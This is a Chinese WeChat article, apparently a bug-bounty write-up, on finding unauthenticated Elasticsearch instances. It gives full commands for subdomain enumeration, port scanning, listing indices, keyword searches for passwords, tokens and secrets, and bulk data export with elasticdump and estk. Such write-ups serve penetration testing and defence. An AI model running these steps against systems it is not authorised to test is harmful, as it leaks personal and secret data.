---
title: 通过Elasticsearch服务发现的信息泄露
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495473&idx=1&sn=7808e30ce486c0ef5a14809aedc4de65&chksm=e8a5e552dfd26c4468da7c843c6cf4c622dd84762bcc18b5004d9861c46deb4ed6e55e5d4bf2&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-08-08
fetch_date: 2025-10-06T18:06:37.552521
---

# 通过Elasticsearch服务发现的信息泄露

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj6LO8jiarT9BicVtItdcM2apiblG9sM9qp8uc6aS5LFlhZGSiaUe4Tq3duz63pgeTlmycO1k8DmkSIqIg/0?wx_fmt=jpeg)

# 通过Elasticsearch服务发现的信息泄露

richardo1o1

迪哥讲事

## 正文

在进行信息搜集的时候,发现某目标的9200端口是开着的:

一般性流程如下:

1.使用Sublist3r、Amass 等子域名暴力破解工具进行子域名暴力破解

```
sublist3r -d example.com -o subdomains.txt

amass enum -d example.com -o subdomains.txt
```

~

2.扫描开放端口

```
nmap -iL subdomains.txt -p 9200 --open -oG nmap_results.txt

-iL subdomains.txt 参数指定输入文件，-p 9200 指定要扫描的端口，--open 仅显示开放的端口，-oG nmap_results.txt 将结果保存到文件。
```

3. 识别Elasticsearch服务

检查 nmap\_results.txt 中是否有9200端口开放的记录。如果有，通常意味着该端口上运行着Elasticsearch服务。

4.验证Elasticsearch服务

通过浏览器或命令行工具（如 curl）访问发现的9200端口，验证是否为Elasticsearch服务。

这里就访问了 http://test.redacted.com:9200/，返回的信息如下：

```
{
  "name" : "4yXXXXX",
  "cluster_name" : "docker-cluster",
  "cluster_uuid" : "ulM_pLwNQbWXXXXXXXX",
  "version" : {
    "number" : "6.x.x",
    "build_flavor" : "default",
    "build_type" : "tar",
    "build_hash" : "3bd3e59",
    "build_date" : "2019-03-06T15:16:26.86xxxxxx",
    "build_snapshot" : false,
    "lucene_version" : "7.6.x",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}
```

这些信息表明Elasticsearch服务是公开的，并且没有任何访问权限控制。

5.枚举所有索引 使用以下URL枚举了所有可用的索引： http://test.redacted.com:9200/\_cat/indices?v 这一步可以列出所有的数据库索引名称。

这里举个例子:

使用 curl 列出索引

```
curl -X GET "http://ip:9200/_cat/indices?v"

这个命令将返回一个包含所有索引名称的列表。例如：

health status index               uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   aim_high            abcdef1234567890       1   1   2211       0            5.9mb      2.9mb
green  open   .opensearch-observability efghijkl12345678   1   1   0          0            208b       104b
green  open   .kibana_1           ijklmnop12345678       1   1   1          0            5.3kb      2.6kb
```

6.搜索敏感信息 使用以下URL执行全索引搜索，以查找可能的敏感信息： `http://test.redacted.com:9200/_all/_search?q=email`这个查询会在所有索引中搜索包含“email”的文档。还有一些其他常用的搜索关键词，例如：username, user, email, password, token, secret, key也可以尝试

7. 导出数据

如果需要导出数据，可以使用 elasticdump 工具。首先安装 elasticdump：

`sudo npm install elasticdump -g`

然后使用以下命令导出数据：

`elasticdump --input=http://ip:9200/aim_high --output=aim_high.json --type=data`

这场还有一种方法就是使用estk这种工具(https://github.com/LeakIX/estk)来提取其中的数据:

在确认目标服务器是否在线并且可以访问以后:

列出Elasticsearch索引： 使用estk工具连接到Elasticsearch实例，并列出所有可用的索引。命令示例如下：

`estk --url=https://example.com list`

工具会输出所有索引的详细信息，包括索引名称、文档数量和大小等。

提取特定索引的数据： 使用estk工具提取特定索引的数据。命令示例如下：

`estk dump --url=https://example.com --index=aim_high`

~

工具会以JSON格式输出索引数据，表明该Elasticsearch实例没有任何访问控制。

## 参考

https://hackerone.com/reports/2231261

https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch

https://infosecwriteups.com/haystack-hackthebox-writeup-7dfd8a6fed5

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过